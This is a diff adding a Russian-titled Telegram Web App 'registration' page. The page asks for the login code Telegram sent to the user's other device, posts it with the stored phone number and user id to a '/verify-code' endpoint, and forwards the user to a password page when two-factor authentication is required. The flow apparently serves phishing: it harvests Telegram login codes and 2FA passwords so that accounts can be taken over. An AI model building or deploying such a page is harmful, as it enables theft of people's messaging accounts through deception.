@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #111;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 420px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            margin-top: 8px;
+            font-size: 0.9rem;
+            color: #888;
+            font-weight: 400;
+        }
+
+        .reg {
+            margin-top: 20%;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            row-gap: 12px;
+        }
+
+        .form {
+            margin-top: 0;
+            display: flex;
+            flex-direction: column;
+            row-gap: 15px;
+            padding: 0 20px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .phone {
+            border: 1px solid #333;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            padding: 14px;
+            font-size: 16px;
+            background: #111;
+            color: #fff;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .phone:focus-within {
+            border-color: rgb(135, 116, 225);
+            border-width: 2px;
+            transform: scale(1.02);
+            box-shadow: 0 0 0 1px rgba(138, 43, 226, 0.3);
+        }
+
+        #phone-input {
+            flex: 1;
+            background: transparent !important;
+            border: none !important;
+            outline: none !important;
+            color: #fff;
+            font-size: 16px;
+            padding: 0;
+            margin: -5px;
+            box-shadow: none !important;
+            width: 100%;
+            font-family: inherit;
+            caret-color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            color: #888;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .phone.has-value .phone-number,
+        .phone:focus-within .phone-number {
+            font-size: 12px;
+            color: rgb(135, 116, 225);
+            top: -8px;
+            left: 15px;
+            background: #111;
+            padding: 0 5px;
+            transform: translateY(0);
+        }
+
+        .phone.has-value .phone-number {
+            color: #888;
+        }
+
+        .phone:focus-within .phone-number {
+            color: rgb(135, 116, 225);
+        }
+
+        /* Стили для ошибки */
+        .phone.error {
+            border-color: #ff4444;
+        }
+
+        .phone.error:focus-within {
+            border-color: #ff4444;
+            box-shadow: 0 0 0 1px rgba(255, 68, 68, 0.3);
+        }
+
+        .phone.error .phone-number {
+            color: #ff4444;
+        }
+
+        .phone.error:focus-within .phone-number {
+            color: #ff4444;
+        }
+
+        /* Стили для иконки карандаша */
+        .edit-icon {
+            position: absolute;
+            right: -30px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+        }
+
+        .edit-icon:hover {
+            opacity: 1;
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .phone-number-container {
+            position: relative;
+            display: inline-block;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="reg">
+            <div id="duck" style="width: 120px; height: 120px;"></div>
+            <div class="header">
+                <div class="phone-number-container">
+                    <h1 id="phone-display" style="font-size: 1.5rem !important; margin: 0; display: inline-block;">None</h1>
+                    <svg class="edit-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M11 4H4C3.46957 4 2.96086 4.21071 2.58579 4.58579C2.21071 4.96086 2 5.46957 2 6V20C2 20.5304 2.21071 21.0391 2.58579 21.4142C2.96086 21.7893 3.46957 22 4 22H18C18.5304 22 19.0391 21.7893 19.4142 21.4142C19.7893 21.0391 20 20.5304 20 20V13"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                        <path
+                            d="M18.5 2.5C18.8978 2.10217 19.4374 1.87868 20 1.87868C20.5626 1.87868 21.1022 2.10217 21.5 2.5C21.8978 2.89782 22.1213 3.43739 22.1213 4C22.1213 4.56261 21.8978 5.10217 21.5 5.5L12 15L8 16L9 12L18.5 2.5Z"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                    </svg>
+                </div>
+                <p class="subtitle">We've sent the code to the Telegram app on your<br>other device.</p>
+            </div>
+            <div class="form">
+                <div class="phone" id="phoneContainer">
+                    <span class="phone-number">Code</span>
+                    <input id="phone-input" type="tel" inputmode="numeric">
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+
+        // Загрузка TGS анимации
+        const animation = lottie.loadAnimation({
+            container: document.getElementById('duck'),
+            renderer: 'svg',
+            loop: true,
+            autoplay: true,
+            path: '/static/duck.json'
+        });
+        animation.play();
+
+        const phoneInput = document.getElementById("phone-input");
+        const phoneContainer = document.getElementById("phoneContainer");
+        const phoneNumberLabel = document.querySelector(".phone-number");
+        const editIcon = document.querySelector(".edit-icon");
+        const phoneDisplay = document.getElementById("phone-display");
+
+        // Функция для получения номера из localStorage
+        function getSavedPhoneNumber() {
+            return localStorage.getItem('userPhoneNumber') || '+7 --- --- ---';
+        }
+
+        // Функция для сохранения номера в localStorage
+        function savePhoneNumber(phoneNumber) {
+            localStorage.setItem('userPhoneNumber', phoneNumber);
+        }
+
+        // Инициализация номера телефона при загрузке страницы
+        function initializePhoneNumber() {
+            const savedPhoneNumber = getSavedPhoneNumber();
+            phoneDisplay.textContent = savedPhoneNumber;
+        }
+
+        // Вызываем инициализацию при загрузке
+        initializePhoneNumber();
+
+        // Обработчик клика на иконку карандаша
+        editIcon.addEventListener('click', async function () {
+            try {
+                window.location.href = '/auth';
+            } catch (error) {
+                console.log('Error loading auth page:', error);
+            }
+        });
+
+        // Проверяем начальное состояние
+        if (phoneInput.value.length > 0) {
+            phoneContainer.classList.add('has-value');
+        }
+
+        // Ограничение ввода до 5 цифр
+        phoneInput.addEventListener('input', function () {
+            // Оставляем только цифры и ограничиваем длину
+            this.value = this.value.replace(/\D/g, '').slice(0, 5);
+
+            // Обновляем состояние has-value
+            if (this.value.length > 0) {
+                phoneContainer.classList.add('has-value');
+            } else {
+                phoneContainer.classList.remove('has-value');
+            }
+
+            // Убираем ошибку при изменении
+            if (phoneContainer.classList.contains('error')) {
+                phoneContainer.classList.remove('error');
+                phoneNumberLabel.textContent = 'Code';
+            }
+
+            // Автоматически отправляем запрос при вводе 5 цифр
+            if (this.value.length === 5) {
+                sendCode();
+            }
+        });
+
+        // Функция отправки кода
+        async function sendCode() {
+            const code = phoneInput.value;
+            const phoneNumber = localStorage.getItem('userPhoneNumber');
+
+            try {
+                const response = await fetch('/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone_number: phoneNumber,
+                        code: code,
+                        user_id: tg.initDataUnsafe?.user?.id || 'web_user'
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success) {
+                        window.location.href = '/success';
+                    } else if (data.requires_2fa) {
+                        window.location.href = '/password';
+                    } else {
+                        showError();
+                    }
+                } else {
+                    const errorData = await response.json();
+                    if (errorData.detail === "Invalid code") {
+                        showError();
+                    } else if (errorData.detail === "Two-factor authentication required") {
+                        try {
+                            window.location.href = '/password';
+                        } catch (innerError) {
+                            console.log('Inner error:', innerError);
+                        }
+                    } else {
+                        showError("Error");
+                    }
+                }
+            } catch (error) {
+                console.log('Error:', error);
+            }
+        }
+
+        // Функция показа ошибки
+        function showError() {
+            phoneContainer.classList.add('error');
+            phoneNumberLabel.textContent = 'Invalid code';
+        }
+    </script>
+</body>
+
+</html>
